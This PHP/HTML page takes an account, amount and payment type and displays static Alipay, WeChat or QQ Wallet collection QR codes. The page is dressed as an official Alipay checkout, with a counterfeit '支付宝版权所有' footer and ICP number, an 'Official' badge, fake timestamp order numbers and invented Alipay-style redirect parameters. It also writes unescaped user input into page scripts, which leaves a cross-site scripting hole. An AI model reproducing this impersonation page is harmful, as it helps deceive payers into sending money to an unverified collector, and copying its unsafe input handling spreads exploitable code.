<SCRIPT language="JavaScript">
javascript:window.history.forward(1);                       //防止重复提交验证禁止返回
</SCRIPT>

<?php
////////////////////////////////////电脑客户端浏览器///////////////////////////////////////////////
error_reporting(0);
require('../Data/config.php');
date_default_timezone_set("PRC");

////////////////////////////////POST 或者GET 接收用户提交参数值/////////////////////////////////////////////////////////
if(!empty($_POST)){
		if($_POST['account'] <= "0"){
	echo "<script> alert('会员账号不可为空,请正确填写会员账号！');parent.location.href='../'; </script>"; 	
}   
        if($_POST['money'] <= "0"){
	echo "<script> alert('付款金额不可为空,请正确填写充值金额！');parent.location.href='../'; </script>"; 
}  
    $user = $_POST["account"];                    //付款账号
    $mode =	$_POST['type'];                       //支付方式
    $money = $_POST["money"];                     //付款金额
	
}else{
		if($_GET['account'] <= "0"){
	echo "<script> alert('会员账号不可为空,请正确填写会员账号！');parent.location.href='../'; </script>"; 
}  
        if($_GET['money'] <= "0"){
	echo "<script> alert('付款金额不可为空,请正确填写充值金额！');parent.location.href='../'; </script>"; 
}  
    $user = $_GET["account"];                    //付款金额
    $money = $_GET["money"];                     //付款金额
    $mode =	$_GET['type'];                       //支付方式
}


$money = sprintf("%01.2f",$money);

//////////////////////////////////////自动识别判断是否手机或者电脑浏览器/////////////////////////////////////////
function isMobile(){ 
  $useragent=isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : ''; 
  $useragent_commentsblock=preg_match('|\(.*?\)|',$useragent,$matches)>0?$matches[0]:'';    
  function CheckSubstrs($substrs,$text){ 
    foreach($substrs as $substr) 
      if(false!==strpos($text,$substr)){ 
        return true; 
      } 
      return false; 
  }
  $mobile_os_list=array('Google Wireless Transcoder','Windows CE','WindowsCE','Symbian','Android','armv6l','armv5','Mobile','CentOS','mowser','AvantGo','Opera Mobi','J2ME/MIDP','Smartphone','Go.Web','Palm','iPAQ');
  $mobile_token_list=array('Profile/MIDP','Configuration/CLDC-','160×160','176×220','240×240','240×320','320×240','UP.Browser','UP.Link','SymbianOS','PalmOS','PocketPC','SonyEricsson','Nokia','BlackBerry','Vodafone','BenQ','Novarra-Vision','Iris','NetFront','HTC_','Xda_','SAMSUNG-SGH','Wapaka','DoCoMo','iPhone','iPod'); 
      
  $found_mobile=CheckSubstrs($mobile_os_list,$useragent_commentsblock) || 
       CheckSubstrs($mobile_token_list,$useragent); 
      
  if ($found_mobile){ 
    return true; 
  }else{ 
    return false; 
  } 
}
if (isMobile()){
     header("location: ../App/index.php?goto=https://excashier.alipay.com&payOrderId=98sf88b23jwfgd3&money=".$money.'&type='.$mode.'&account='.$user);   //如果为手机端，执行跳转
}
else{
	  //如果非手机端，不跳转

$userkey = md5(date('YmdHis',time()).$money.$user.$mode.rand(100000000,999999999));
$utime = substr(date('YmdHis',time()),0,8); 
file_put_contents('../Data/Order/'.$utime."-".$money.".mdb", "1"); 

/////////////////支付宝/////////////////////////
if($mode==1){
	$sjxz1="首次使用请下载手机支付宝 ";
	$sjxz2="https://mobile.alipay.com/index.htm";
	$smfk="../images/img/Scan code4.png";
	$logo="../images/img/logo2.png";
	$bx="支付宝";
	$Whether="../images/Alipay/".$money.".jpg";      
	if(file_exists($Whether)){
		$skm="../images/Alipay/".$money.".jpg";      //读取支付宝已设定金额收款二维码  注意：图片重命名： 10.00.jpg  50.00.jpg  100.00.jpg  等等.....
}else{
	    $skm="../images/Other/Alipay.jpg";           //读取支付宝没有设定金额收款二维码  适合免设定金额使用..
}
}
//////////////////微信////////////////////////	
if($mode==2){
	$sjxz1="首次使用请下载手机微信";
	$sjxz2="http://weixin.qq.com/";
	$smfk="../images/img/Scan code2.png";
	$logo="../images/img/logo3.png";
	$bx="微信";
	$Whether="../images/WeChat/".$money.".jpg";        
	if(file_exists($Whether)){
        $skm="../images/WeChat/".$money.".jpg";     //读取微信已设定金额收款二维码     注意：图片重命名： 10.00.jpg  50.00.jpg  100.00.jpg  等等.....
}else{
        $skm="../images/Other/WeChat.jpg";          //读取微信没有设定金额收款二维码     适合免设定金额使用...
}
}

//////////////////QQ钱包/////////////////////////
if($mode==3){
	$sjxz1="首次使用请下载手机财付通";
	$sjxz2="http://im.qq.com/mobileqq/";
	$smfk="../images/img/Scan code3.png";
	$logo="../images/img/logo1.png";
	$bx="QQ钱包";
	$Whether="../images/Tenpay/".$money.".jpg";    
	if(file_exists($Whether)){
       $skm="../images/Tenpay/".$money.".jpg";      //读取QQ钱包已设定金额收款二维码     注意：图片重命名： 10.00.jpg  50.00.jpg  100.00.jpg  等等.....
}else{
       $skm="../images/Other/Tenpay.jpg";           //读取QQ钱包没有设定金额收款二维码     适合免设定金额使用...
}	
}
}

header("Cache-control:no-cache,no-store,must-revalidate");
header("Pragma:no-cache");
header("Expires:0");	
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf8" />
<title><?php echo $bx;?> - 网银在线快捷支付支付 安全快速！</title>
<style type="text/css">
<!--
a:link {
	color: #FFFFFF;
	text-decoration: none;
}
a:visited {
	text-decoration: none;
}
a:hover {
	text-decoration: none;
}
a:active {
	text-decoration: none;
}
body,td,th {
	font-size: small;
	color: #000000;
}
.STYLE1 {color: #FFFFFF}
.STYLE3 {color: #333333}
.STYLE5 {color: #000000}
.STYLE8 {color: #00FFFF}
#Layer1 {
	position:absolute;
	left:635px;
	top:517px;
	width:185px;
	height:143px;
	z-index:1;
	visibility: visible;
}
.STYLE10 {color: #FF0000; font-weight: bold; font-size: medium; }
.STYLE13 {color: #FF0000; font-weight: bold; font-size: large; }
.STYLE14 {color: #666666}
.STYLE16 {color: #0066CC}
-->
</style>
<script type="text/JavaScript">
<!--
<!--

//-->

function get_state() {
	var xmlhttp = null;
	if (window.XMLHttpRequest)
	{
		xmlhttp=new XMLHttpRequest();
	}
	else if (window.ActiveXObject)
	{
		xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
	}
  
	if (xmlhttp!=null)
	{
		serverUrl = "../request.php?userkey=<?php echo $userkey;?>&t=<?php echo $utime;?>&m=<?php echo $money;?>&s=<?php echo $user;?>&d=<?php echo $mode;?>";
		xmlhttp.open( "GET", serverUrl, false );
		xmlhttp.send( null );
		xmlhttp.responseText
		if (xmlhttp.responseText == "0"){
		document.getElementById("Image4").src = "../images/img/logcg.jpg";
        window.setTimeout("window.location='../standard/Success.php?goto=https://shenghuo.alipay.com%2Fsend%2Fpayment%2Ffill.htm%3F_pdType%3Dafcabecbafgggffdhjch%26_tosheet%3Dtrue98kj2349723hjg89235.0&Thesecretkey='+'<?php echo $userkey;?>'",1500);
			return true;
		}else{
			return false;
		}
	}
	else
	{
		return false;
	}
}

//setInterval("get_state();",500);    //请求时间单位 1000 = 1秒/次

function MM_preloadImages() { //v3.0
  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
}

function MM_findObj(n, d) { //v4.01
  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
  if(!x && d.getElementById) x=d.getElementById(n); return x;
}

function MM_swapImgRestore() { //v3.0
  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
}

function MM_swapImage() { //v3.0
  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
}
//-->
</script>
</head>

<body onLoad="MM_preloadImages('../images/sm1.png','../images/img.gif','../images/dlfk1.png','../images/img/Login1.png','../images/img/Scan code1.png')">
<table width="100%" height="25" border="0" cellpadding="0" cellspacing="0" bgcolor="#81868B">
  <!--DWLayoutTable-->
  <tr>
    <td width="56%" height="29" bordercolor="#FFFFFF">&nbsp;</td>
    <td width="17%" bordercolor="#FFFFFF"><div align="right"><span class="STYLE1">你好，欢迎使用<?php echo $bx;?>付款！</span></div></td>
    <td width="4%" bordercolor="#FFFFFF"><div align="center" class="STYLE3">|</div></td>
    <td width="23%" bordercolor="#FFFFFF"><a href="https://help.alipay.com/lab/help_detail.htm?help_id=258086" target="_blank">常见问题</a></td>
  </tr>
</table>
<div align="center">
  <table width="100%" border="0" cellpadding="0" cellspacing="0">
    <!--DWLayoutTable-->
    <tr>
      <td width="17%" height="40" valign="top">&nbsp;</td>
      <td width="58%" valign="top"><p align="left"><img src="<?php echo $logo;?>" width="220" height="45" align="top" /></p>    </td>
      <td width="9%" valign="top">      <p align="center">&nbsp;</p></td>
      <td width="16%" valign="top">&nbsp;</td>
    </tr>
    <tr>
      <td height="103" bgcolor="#EFEFEF">&nbsp;</td>
      <td valign="bottom" bgcolor="#EFEFEF"><p align="left">正在使用即时到账交易
        <script type="text/javascript">
var t=300;//设定跳转的时间
setInterval("refer()",1000); //启动1秒定时
function refer(){ 
	if(t==0){
		document.getElementById('show').innerHTML="0"; //显示倒计时
		document.getElementById("Image4").src = "../images/img/ssx.jpg";
		window.setTimeout("window.location='<?php echo $Callback;?>'",1000);  //设定订单超时跳转的链接地址
		window.clearTimeout(t1);     //去掉定时器 
	}
	document.getElementById('show').innerHTML="剩余"+t+"秒完成付款.....[?]"; //显示倒计时
	t--; //计数器递减
}
  </script>
        <span id="show"></p>
      <p>&nbsp;</p>
      <p align="left"><strong>交易订单号</strong>：<?php echo date('YmdHis',time());?>.....&nbsp;&nbsp;&nbsp;<strong>收款方</strong>：<?php echo $mone;?></p></td>
      <td valign="bottom" bgcolor="#EFEFEF"><p align="center"><span class="STYLE13"><?php echo $money;?></span><span class="STYLE5"> 元</span></p>
        <table width="75" border="0" align="center" cellpadding="0" cellspacing="0">
          <tr>
            <td width="49" height="20" bgcolor="#999999"><div align="center" class="STYLE1"><strong>订单详情</strong> </div></td>
          </tr>
        </table>       </td>
      <td bgcolor="#EFEFEF">&nbsp;</td>
    </tr>
    <tr>
      <td height="522" valign="top" bgcolor="#EFEFEF">&nbsp;</td>
      <td valign="top" bgcolor="#FFFFFF"><p>&nbsp;</p>
        <p>&nbsp;</p>
        
      
        <div align="center">
          <table width="599" border="0" cellpadding="0" cellspacing="0">
            <tr>
              <td width="217" height="271" valign="top"><p align="center"><a href="#" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image4','','../images/img/wait for.gif',1)"></a></p>
                <p align="center">&nbsp;</p>
                <p align="center"><a href="#" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image4','','../images/img/wait for.gif',1)"></a></p>
                <p align="center">&nbsp;</p>
              <p align="center"><a href="<?php echo $sjxz2;?>" target="_blank" class="STYLE5" seed="copyright-link" smartracker="on"></a></p></td>
              <td width="178" valign="top"><p align="center">扫一扫付款（元）</p>
                <p align="center"><span class="STYLE10"><?php echo $money;?></span></p>
                <p align="center"><a href="#" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image4','','../images/img/wait for.gif',1)"><img src="<?php echo $skm;?>" alt="1" name="Image4" width="170" height="170" border="0" id="Image4" /></a></p>
              <p align="center"><img src="../images/img/app.png" alt="1" width="136" height="38" /></p>
              <p align="center"><a href="<?php echo $sjxz2;?>" target="_blank" class="STYLE5" seed="copyright-link" smartracker="on"><span class="STYLE16"><?php echo $sjxz1;?></span></a></p></td>
              <td width="204" valign="top"><a href="#" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image6','','../images/img/Scan code1.png',1)"><img src="<?php echo $smfk;?>" name="Image6" width="204" height="183" border="0" id="Image6" /></a><a href="#" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image6','','../images/sm1.png',1)"></a></td>
            </tr>
          </table>
        </div>
      <div align="right"></div><div align="right"></div>    </td>
      <td align="center" valign="middle" bgcolor="#E6E6E6"><p><a href="#" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image7','','../images/dlfk1.png',1)"></a><a href="#" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image7','','../images/img/Login1.png',1)"><img src="../images/img/Login.png" name="Image7" width="151" height="522" border="0" id="Image7" /></a></p>
      <label></label>
        <label></label></td>
      <td valign="top" bgcolor="#EFEFEF">&nbsp;</td>
    </tr>
    <tr>
      <td height="119" bgcolor="#EFEFEF">&nbsp;</td>
      <td valign="top" bgcolor="#EFEFEF"><div align="center">
        <p>&nbsp;</p>
        <p><?php echo $bx;?>版权所有 2004-<?php echo date('Y');?> &nbsp; <a href="https://b.alipay.com" target="_blank" class="STYLE5" seed="copyright-link" smartracker="on"><span class="STYLE14">ICP证：沪B2-2010362725</span></a></p>
        <p>&nbsp;</p>
        <p><img src="../images/img/Official.png" width="518" height="30" /></p>
      </div></td>
      <td bgcolor="#EFEFEF">&nbsp;</td>
      <td bgcolor="#EFEFEF">&nbsp;</td>
    </tr>
  </table>
</div>
</body>
</html>